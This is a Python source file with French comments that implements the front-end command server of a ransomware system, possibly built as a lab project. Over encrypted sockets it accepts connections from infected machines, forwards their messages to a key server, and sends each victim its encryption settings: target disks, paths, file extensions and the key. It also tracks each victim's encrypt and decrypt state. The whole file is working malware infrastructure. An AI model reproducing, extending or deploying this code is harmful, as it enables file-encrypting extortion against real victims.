import utile.network as network
import utile.message as message
import utile.security as security
import pickle
import utile.config as config
import time
import threading
import queue

DEBUG=True
configuration_serveur=config.get_config("../utile/serv_frontal")  # Reprend la config sur disque
time_retry = configuration_serveur["CONN_RETRY"]  # Prend le temps entre chaque reconnexion vers le serveur de clé dans la config

# Enregistrement de l'état (ID : STATE)
etats={}


def ransomware(conn_r, queue_requetes, queue_reponses):
        # Hellman (clé)
        cle_chiffrement_ransomware = security.hellman_serveur(conn_r)  # La clé commune de chiffrement avec le ransomware
        while True:
            msg = network.receiv_msg(conn)  # Attente d'un message
            if msg:
                msg = security.decrypt(msg, cle_chiffrement_ransomware)
                msg = pickle.loads(msg)
                if DEBUG:
                    print(f"Message reçu du ransomware : {msg}")
                if message.get_message_type(msg) == "INITIALIZE":
                    disks=msg["DISKS"].split(", ") #Disques (convertis en liste)
                    type_windows=msg["OS"]
                    queue_requetes.put(msg) #Envoie au thread de communication avec le serveur de clés
                    msg = queue_reponses.get(block=True) #Attend la réponse du serveur de clés
                    if DEBUG:
                        print(f"Message reçu du serveur de clés : {msg}")

                    # Enregistrement de l'état (ID : STATE)
                    etats[msg['KEY_RESP']]=msg['STATE']

                    # Configuration selon si c'est un serveur ou une workstation
                    if type_windows == "Workstation":
                        configuration=config.get_config("../utile/workstation")
                    else:
                        configuration=config.get_config("../utile/serveur")
                    paths=configuration["PATHS"]
                    file_ext=configuration["FILE_EXT"]
                    freq=configuration["FREQ"]

                    # !! Disques de tests avec disques virtuels (ligne à enlever dans de vraies circonstances
                    # car variable déjà définie ligne 30 avec les données du ransomware)
                    disks=['Z:', 'Y:']

                    msg=message.set_msg("CONFIGURE", [msg['KEY_RESP'], [disks, paths, file_ext, freq, msg['KEY'], msg['STATE']]])
                    # Envoie de la configuration complete au ransomware
                    network.send_msg(conn, security.encrypt(pickle.dumps(msg), cle_chiffrement_ransomware))
                    if DEBUG:
                        print(f"Message répondu au ransomware : {msg}\n")
                elif message.get_message_type(msg) == "RESTART":
                    etats[msg['RESTART']] = "RESTART"
                    queue_requetes.put(msg)  # Envoie au thread de communication avec le serveur de clés
                    msg = queue_reponses.get(block=True)  # Attend la réponse du serveur de clés
                    network.send_msg(conn, security.encrypt(pickle.dumps(msg), cle_chiffrement_ransomware))
                    if DEBUG:
                        print(f"Message répondu au ransomware : {msg}\n")
                elif message.get_message_type(msg) == "CRYPT":
                    # Si le ransomware n'est pas déjà en mode CRYPT on l'envoie au serv de clés
                    if etats[msg["CRYPT"]] != "CRYPT":
                        queue_requetes.put(msg)  # Envoie au thread de communication avec le serveur de clés
                        queue_reponses.get(block=True)  # Attend la confirmation d'envoi du message CRYPT au serv de clés
                        etats[msg["CRYPT"]] = "CRYPT"
                elif message.get_message_type(msg) == "PENDING":
                    etats[msg["PENDING"]] = "PENDING"
                    queue_requetes.put(msg)
                    reponse=queue_reponses.get(block=True)  # Attend le message recu ou non du serveur de clés
                    if reponse != "RIEN":  # Message DECRYPT recu -> envoie au ransomware
                        network.send_msg(conn, security.encrypt(pickle.dumps(reponse), cle_chiffrement_ransomware))
                        etats[reponse["DECRYPT"]] = "DECRYPT"
                    #Sinon on ne fait rien d'autre
                elif message.get_message_type(msg) == "PROTECTREQ":
                    etats[msg['PROTECTREQ']] = "PROTECTED"
                    fichiers_decrypte=msg["NB_FILE"]
                    queue_requetes.put(msg)  # Envoie au thread de communication avec le serveur de clés
                    msg = queue_reponses.get(block=True)  # Attend la réponse du serveur de clés
                    fichiers_crypte=msg["NB_FILE"]
                    msg=message.set_msg("PROTECTRESP", [msg["COUNT"],
                                f"We decrypted {fichiers_decrypte} files out of {fichiers_crypte} encrypted files !"])
                    network.send_msg(conn, security.encrypt(pickle.dumps(msg), cle_chiffrement_ransomware))
            else:
                # (Une fois deconnecté) ->Demande de suppression des 2 queues FIFO en passant par la queue FIFO (pour ne pas générer d'erreurs)
                queue_requetes.put("DELETE")
                break  # Sortie du while --> Thread fini


def serveur_cles():
    s_serveur_cle = None
    while not s_serveur_cle:  # Connexion au serveur de clés (Avec un retry après "time_retry" secondes)
        s_serveur_cle = network.conn_serv(port=8381)
        if s_serveur_cle is None:
            print(f"Reconnexion dans {time_retry} secondes..\n")
            time.sleep(time_retry)

    queue_connexion.put("Connecté")  # Connexion établie --> envoie du message vers le thread master

    # Hellman (clé)
    cle_chiffrement_serv_cles = security.hellman_client(s_serveur_cle)  # La clé commune de chiffrement avec le serveur de clés
    # Boucle pour gérer toutes les queues FIFO en boucle
    while True:
        k=0
        while k<len(queues_requetes):  # Boucle sur toutes les queues
            try:
                # Essaye de récupérer les messages envoyé par le thread "ransomware" (dans toutes les queues)
                msg=queues_requetes[k].get(block=False)
            except Exception:
                pass
            else:  # Transactions avec la BD (Message provenant du ransomware) + envoi de la réponse au serveur de clés
                if DEBUG:
                    print(f"\nMessage vennant d'une QUEUE FIFO : {msg}")
                if msg=="DELETE":  # Suppression des queues FIFO sur demande du ransomware qui vient de se déconnecter
                    queues_reponses.pop(k)
                    queues_requetes.pop(k)
                elif message.get_message_type(msg) == "INITIALIZE": #Envoie au serv de clés et reception (+envoie dans la queue FIFO)
                    network.send_msg(s_serveur_cle, security.encrypt(pickle.dumps(msg), cle_chiffrement_serv_cles))
                    reponse=network.receiv_msg(s_serveur_cle)
                    reponse=security.decrypt(reponse, cle_chiffrement_serv_cles)
                    reponse=pickle.loads(reponse)
                    queues_reponses[k].put(reponse)
                elif message.get_message_type(msg) == "RESTART": #Envoie au serv de clés et reception (+envoie dans la queue FIFO)
                    network.send_msg(s_serveur_cle, security.encrypt(pickle.dumps(msg), cle_chiffrement_serv_cles))
                    reponse = network.receiv_msg(s_serveur_cle)
                    reponse = security.decrypt(reponse, cle_chiffrement_serv_cles)
                    reponse = pickle.loads(reponse)
                    queues_reponses[k].put(reponse)
                elif message.get_message_type(msg) == "CRYPT":  # Envoi de CRYPT au serv de clés
                    network.send_msg(s_serveur_cle, security.encrypt(pickle.dumps(msg), cle_chiffrement_serv_cles))
                    queues_reponses[k].put("Envoyé")
                elif message.get_message_type(msg) == "PENDING":  # Envoi de PENDING au serv de clés + attente possible de réponse
                    network.send_msg(s_serveur_cle, security.encrypt(pickle.dumps(msg), cle_chiffrement_serv_cles))
                    reponse = network.receiv_msg(s_serveur_cle)
                    if reponse:  # Message DECRYPT RECU --> Envoie au ransomware
                        reponse = security.decrypt(reponse, cle_chiffrement_serv_cles)
                        reponse = pickle.loads(reponse)
                        queues_reponses[k].put(reponse)
                    else:  # Message non recu
                        queues_reponses[k].put("RIEN")  # Envoie de "RIEN" au thread du ransomware pour le débloquer
                elif message.get_message_type(msg) == "PROTECTREQ":
                    network.send_msg(s_serveur_cle, security.encrypt(pickle.dumps(msg), cle_chiffrement_serv_cles))
                    reponse = network.receiv_msg(s_serveur_cle)
                    reponse = security.decrypt(reponse, cle_chiffrement_serv_cles)
                    reponse = pickle.loads(reponse)
                    queues_reponses[k].put(reponse)
            k+=1


# 2 listes de X queues FIFO pour X ransomware
queues_requetes=[]
queues_reponses=[]

# Queue pour mettre en pause le MASTER THREAD jusqu'à ce que la connexion au serveur de clés soit effective
# Confirmation de connexion envoyée du thread "serveur de clé" au "master" thread
queue_connexion=queue.Queue()

#Thread "Thread Serv clés" pour la communication avec le serveur de clés
thread_srv_cles=threading.Thread(target=serveur_cles)
thread_srv_cles.start()

# Attente de confirmation de connexion au serveur de clés (en mode BLOCK pour bloquer le thread jusqu'à la réponse)
queue_connexion.get(block=True)

s_serv=network.start_srv(port=8443)  # Démarre le serveur frontal pour écouter les ransomware

while True:  # Boucle infinie pour accepter une infinité de ransomware
    if DEBUG:
        print("En attente d'une connexion..")
    conn, (ip, port) = s_serv.accept()  # Attente d'une connexion (écoute des ransomware)
    if DEBUG:
        print(f"Ransomware connecté ! (IP: {ip}, PORT: {port})\n")
    # Ajout des Queues FIFO dans les listes pour ce ransomware
    queues_requetes.append(queue.Queue())
    queues_reponses.append(queue.Queue())
    # Démarre un thread pour un nouveau ransomware (Avec les 2 dernieres queues FIFO en argument)
    thread_ransomware = threading.Thread(target=ransomware, args=[conn, queues_requetes[-1], queues_reponses[-1]])
    thread_ransomware.start()
